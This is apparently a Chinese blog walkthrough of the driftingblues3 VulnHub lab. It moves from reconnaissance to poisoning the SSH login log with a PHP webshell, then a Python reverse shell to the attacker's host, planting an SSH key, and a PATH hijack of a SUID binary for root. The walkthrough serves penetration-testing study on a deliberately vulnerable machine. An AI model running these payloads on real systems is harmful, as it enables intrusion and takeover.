---
title: driftingblues3 VulnHub Walkthrough
date: 2021-10-13 17:09:41
categories:
- 渗透测试
tags:
- VulnHub
---

### 信息收集

#### 主机发现

```
arp-scan -l
```

![](https://i.loli.net/2021/10/13/gbHz2QBdPq1Fr5m.png)

#### 端口扫描

```
nmap -sC -sV -p- 192.168.62.173 
```

![](https://i.loli.net/2021/10/13/dyUSqGQHbJYXtcP.png)

只开放了22和80端口，先访问80端口看看

![](https://i.loli.net/2021/10/13/v23PbJpqjdwMiXl.png)

好像没有什么信息，扫一下目录

```
dirsearch -u http://192.168.62.173/
```

![](https://i.loli.net/2021/10/13/QvTbR73iftpaIZY.png)

有点奇怪，逐个看了一下，好像都是没用的信息

![](https://i.loli.net/2021/10/13/DcIX8Bov5bh4KlS.png)

再看看robots.txt，是唯一有用的路径

![](https://i.loli.net/2021/10/13/Z97ixT5SKCVjzuy.png)

接着访问一下

![](https://i.loli.net/2021/10/13/RnyvEz1OImLurMZ.png)

emmm再接再厉，继续访问

![](https://i.loli.net/2021/10/13/dWAkgJ5BQLy81OI.png)

好像是诗歌还是歌词，目前没有什么信息，查看一下源码

![](https://i.loli.net/2021/10/13/hV3pdTlWcbvkABE.png)

base64编码，到在线网站转换一下

<img src="https://i.loli.net/2021/10/13/8EgkBodRq1YjAOH.png" style="zoom: 67%;" />

哎，还要再转换一次

<img src="https://i.loli.net/2021/10/13/KC1QoRcmuTqG4fE.png" style="zoom:67%;" />

提示了一个php文件，去访问一下

![](https://i.loli.net/2021/10/13/JPCuhSeUZXnOkRq.png)

### 漏洞发现

这个php文件是应该ssh登录日志，先随便尝试一下登录，看会不会有记录

![](https://i.loli.net/2021/10/13/nFKbN5to2rTjSHa.png)

可以看到两个登录用户名都已经记录了，那接下来就尝试通过日志写shell

![](https://i.loli.net/2021/10/13/UXd7Z2kRHJmP8cu.png)

### 漏洞利用&getshell

以php的webshell作为用户名来登录ssh

```
ssh '<?php system($_GET["cmd"]);?>'@192.168.62.173
```

![](https://i.loli.net/2021/10/13/VQBO5Tumo1YRdLN.png)

看一下效果，看到已经可以执行命令了

![](https://i.loli.net/2021/10/13/hEsStkQvywi58UL.png)

#### 反弹shell

先看一下有没有python环境

![](https://i.loli.net/2021/10/13/JajMB9ytKZoHbur.png)

可以看到，靶机是有python3环境的，那就试试python来反弹shell

先开启一个监听端口来接收反弹的shell

![](https://i.loli.net/2021/10/13/e6KnGq2tVahXDj3.png)

访问一下

```
http://192.168.62.173/adminsfixit.php?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.62.134%22,1234));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22/bin/bash%22)%27
```

在本机已经接收到了shell

![](https://i.loli.net/2021/10/13/i1go6kHnBwEvKqZ.png)

#### SSH登录

进入到/home/robertj目录，发现.ssh是有写权限的，那我们就可以将我们的公钥写进去，实现免密登录

先在本地生成公私钥

```
ssh-keygen	#一直回默认就可以
```

<img src="https://i.loli.net/2021/10/13/uRrKZvgWmeOd2wz.png" style="zoom:80%;" />

进入本地ssh目录，查看一下id_rsa.pub

![](https://i.loli.net/2021/10/13/86VYpyWAalHc1I3.png)

将id_rsa.pub的内容复制到authorized_keys

```
cat id_rsa.pub >> authorized_keys
```

然后上传到靶机的ssh目录，先在本机用python开启一个http服务

```
python3 -m http.server 80
```

![](https://i.loli.net/2021/10/13/McPewFdQo6hHbUx.png)

到靶机的ssh目录通过wget下载

```
wget http://192.168.62.134/authorized_keys
```

![](https://i.loli.net/2021/10/13/Gj84pDCxswU3HM5.png)

现在可以实现ssh免密登录了

![](https://i.loli.net/2021/10/13/IhaoP4B9NQnbAKF.png)

先获取第一个flag

<img src="https://i.loli.net/2021/10/13/KzHwX46Zqn2ux51.png" style="zoom:67%;" />

### 权限提升

先看一下具有suid的可执行文件

```
find / -perm -u=s -type f 2>/dev/null
```

![](https://i.loli.net/2021/10/13/K9mLIjMbpYq5Du2.png)

看到有一个getinfo命令，先执行一下看看

<img src="https://i.loli.net/2021/10/13/JMgydKAf6sW3wYE.png"  />

看着应该是分别执行了ip a、cat /etc/hosts、uname -a命令

那么执行具有suid的getinfo时，将会执行ip、cat、uname，那我们就可以写一个模拟可执行文件

这里我在tmp目录新建一个文件ip，并赋予执行权限

```
echo "/bin/bash" > /tmp/ip
chmod +x /tmp/ip
```

![](https://i.loli.net/2021/10/13/vGzTbRejQkKW7NB.png)

最后，添加一个环境变量/tmp，这样再执行一次具有suid的getinfo时，就会以root权限执行我们新建的/tmp/ip，我们就可以提权到root了

```
export PATH=/tmp:$PATH
/usr/bin/getinfo
```

![](https://i.loli.net/2021/10/13/jafxOrYPwXck6SQ.png)

现在可以获取第二个flag了

<img src="https://i.loli.net/2021/10/13/N6vYROXlgVuKbWU.png" style="zoom:67%;" />

